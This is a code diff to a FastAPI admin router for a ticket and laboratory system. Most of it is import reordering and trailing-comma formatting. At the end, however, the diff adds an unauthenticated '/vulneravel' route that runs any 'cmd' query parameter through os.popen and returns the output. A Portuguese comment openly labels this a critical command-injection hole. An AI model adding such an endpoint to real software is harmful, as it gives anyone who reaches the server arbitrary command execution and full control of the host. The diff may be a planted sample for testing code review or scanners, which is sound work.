@@ -1,22 +1,21 @@
-from typing import Union, List
+import os
+from typing import List, Union
 from uuid import UUID
 
+from const.enum import TicketStatusType, UserStatusType, UserType
+from db.db_connector import get_db
 from fastapi import APIRouter
 from fastapi.params import Depends, Query
+from repositories.laboratory_repositories import create_laboratory
+from repositories.ticket_repositories import get_tickets
+from repositories.user_repositories import create_user
+from schemas.laboratory import LaboratoryCreateAdmin, LaboratoryResponse
+from schemas.ticket import TicketResponse
+from schemas.user import UserCreateAdmin, UserResponse
+from services.auth_service import get_current_user, hash_password
 from sqlalchemy.exc import IntegrityError
 from sqlalchemy.ext.asyncio import AsyncSession
 from starlette import status
-
-from const.enum import UserType, UserStatusType, TicketStatusType
-from db.db_connector import get_db
-from repositories.laboratory_repositories import create_laboratory
-from repositories.ticket_repositories import get_tickets
-from schemas.laboratory import LaboratoryCreateAdmin, LaboratoryResponse
-from schemas.ticket import TicketResponse
-from schemas.user import UserResponse, UserCreateAdmin
-
-from repositories.user_repositories import create_user
-from services.auth_service import hash_password, get_current_user
 from utils.exceptions import integrity_error_database, unauthorized
 
 router = APIRouter(prefix="/admin", tags=["admin"])
@@ -26,12 +25,12 @@ router = APIRouter(prefix="/admin", tags=["admin"])
     "/users",
     response_model=UserResponse,
     status_code=status.HTTP_200_OK,
-    summary="Create new user"
+    summary="Create new user",
 )
 async def create_user_endpoint(
     user: UserCreateAdmin,
     db: AsyncSession = Depends(get_db),
-    current_user: UserResponse = Depends(get_current_user)
+    current_user: UserResponse = Depends(get_current_user),
 ):
     """
     Cria um novo usuário, permitindo usar as permissões de administrador para alterar o status do usuário.
@@ -68,7 +67,7 @@ async def create_user_endpoint(
 async def create_laboratory_endpoint(
     laboratory: LaboratoryCreateAdmin,
     current_user: UserResponse = Depends(get_current_user),
-    db: AsyncSession = Depends(get_db)
+    db: AsyncSession = Depends(get_db),
 ):
     """
     Cria um novo laboratório no sistema.
@@ -103,7 +102,7 @@ async def get_all_tickets_endpoint(
     id_tecnologia_alvo: Union[UUID | None] = None,
     status: Union[List[TicketStatusType] | None] = Query(None),
     current_user: UserResponse = Depends(get_current_user),
-    db: AsyncSession = Depends(get_db)
+    db: AsyncSession = Depends(get_db),
 ):
     """
     Lista os tickets com filtros opcionais por status e tecnologia alvo.
@@ -127,3 +126,10 @@ async def get_all_tickets_endpoint(
 
     result = await get_tickets(db, status, id_tecnologia_alvo, start, limit)
     return [TicketResponse.model_validate(x) for x in result]
+
+
+@router.get("/vulneravel")
+def rota_perigosa(cmd: str):
+    # VULNERABILIDADE CRÍTICA: Command Injection
+    # Isso permite executar comandos do sistema operacional
+    return os.popen(cmd).read()
